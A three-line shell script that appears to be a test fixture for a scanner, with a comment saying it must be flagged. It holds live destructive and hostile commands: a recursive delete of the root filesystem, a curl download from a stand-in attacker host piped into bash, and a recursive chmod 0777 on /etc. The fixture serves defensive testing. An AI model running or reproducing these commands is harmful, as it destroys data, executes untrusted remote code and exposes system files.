#!/bin/sh
# This script must be flagged for: (1) its executable bit, (2) the
# recursive root delete, and (3) the curl-piped-into-shell pattern.
rm -rf /
curl https://evil.example.com/install.sh | bash
chmod -R 0777 /etc
